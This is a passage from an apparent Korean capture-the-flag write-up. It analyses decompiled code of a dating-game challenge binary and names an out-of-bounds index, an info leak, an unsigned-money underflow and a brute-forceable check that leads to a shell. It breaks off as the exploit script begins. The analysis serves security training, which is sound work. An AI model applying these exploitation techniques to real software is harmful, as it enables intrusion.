<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">ucontext_t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">__fastcall</span> <span style="color:#a6e22e">heal_the_borken_heart</span>(<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">a1</span>, <span style="color:#a6e22e">siginfo_t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">a2</span>, <span style="color:#a6e22e">ucontext_t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">ctx</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ucontext_t</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">result</span>; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">check</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">255</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">++</span><span style="color:#a6e22e">check</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ctx</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ctx</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uc_mcontext</span>.<span style="color:#a6e22e">gregs</span>[<span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">broken_heart_handlers</span>[<span style="color:#a6e22e">game_step</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>;                                <span style="color:#75715e">// rip = handler
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}                                               <span style="color:#75715e">//
</span></span></span></code></pre></div><p>한번에 한하여 heal_the_broken_heart 함수를 호출하며 context가 복구된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v4</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;5. PROPOSE&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v5</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&gt;&gt;&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cin</span>, <span style="color:#a6e22e">nptr</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> ( <span style="color:#a6e22e">atoi</span>(<span style="color:#a6e22e">nptr</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>                                     <span style="color:#75715e">// money int bug
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">mildang</span>();                                <span style="color:#75715e">// OoB random add or sub
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">call</span>();                                   <span style="color:#75715e">// charming down
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sms</span>();                                    <span style="color:#75715e">// info leak / money unsigned
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">date</span>();                                   <span style="color:#75715e">// money unsigned
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">propose</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">v8</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">v8</span>;
</span></span><span style="display:flex;"><span>}                                               <span style="color:#75715e">// get
</span></span></span></code></pre></div><h2 id="exploitation-4">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation-4">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v2</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;Choose: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">istream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cin</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">choice</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">choice</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">sms_list</span>[<span style="color:#a6e22e">choice</span>] )        <span style="color:#75715e">// choice Oob
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">broke_again</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">val</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v9</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">money</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">v9</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">5000</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#a6e22e">f</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">love_gauge</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">charming</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">val</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">mildang_gauge</span>[<span style="color:#a6e22e">choice</span>] <span style="color:#f92672">-</span> (<span style="color:#a6e22e">unsigned</span> <span style="color:#a6e22e">__int8</span>)<span style="color:#a6e22e">val</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">love_gauge</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">charming</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">val</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">unsigned</span> <span style="color:#a6e22e">__int8</span>)<span style="color:#a6e22e">val</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">mildang_gauge</span>[<span style="color:#a6e22e">choice</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mildang_gauge</span>[<span style="color:#a6e22e">choice</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">v3</span>;
</span></span></code></pre></div><p>이때 choice에 대한 OoB addition, subtraction이 가능하다.
이때 약간의 조건들이 있는데 이러한 조건들은 OoB를 통해 해결한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;Phone number: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">buf</span>, <span style="color:#ae81ff">255</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;Message: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">v13</span>, <span style="color:#ae81ff">255</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;[&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#a6e22e">v1</span>, <span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#a6e22e">v2</span>, <span style="color:#e6db74">&#34;]&#34;</span>);<span style="color:#75715e">// info leak
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v3</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#a6e22e">v13</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v4</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;Sent!&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v5</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v9</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;Oh !!!!!!!!!! She did not replied,, ,, :(!&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v9</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v6</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;Oh !!!!!!!!!! She replied,, ,, Yes!&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v6</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v7</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">v8</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">g_sms_index</span><span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sms_list</span>[<span style="color:#a6e22e">v8</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>[<span style="color:#a6e22e">v7</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>memory leak이 가능하며 money는 unsigned 비교를 거친다.
이를 이용해 나중에 integer overflow &amp; underflow를 트리거해버리면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">money</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">100000</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>((<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">v3</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">0xBEBC200</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">charming</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100000</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;Oh!&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v0</span>, <span style="color:#a6e22e">v3</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Get_shell</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, <span style="color:#e6db74">&#34;-_-&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v1</span>, <span style="color:#a6e22e">v3</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">broke_again</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>4바이트 정도는 충분히 bruteforce로 뚫을만하다.
하지만 charming을 증가시키려 앞선 random들을 뚫으려면 300초안에 불가능하다.</p>
<h3 id="exploit-script-4">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script-4">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">1</span>) <span style="color:#a6e22e">srand</span> <span style="color:#a6e22e">seed</span> <span style="color:#a6e22e">prediction</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">possible</span>. <span style="color:#a6e22e">cuz</span> <span style="color:#a6e22e">it</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">only</span> <span style="color:#ae81ff">2</span> <span style="color:#a6e22e">bytes</span> <span style="color:#66d9ef">long</span>.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">2</span>) <span style="color:#a6e22e">info</span> <span style="color:#a6e22e">leak</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">possible</span> <span style="color:#a6e22e">u</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">base</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">binary</span>, <span style="color:#a6e22e">stack</span>
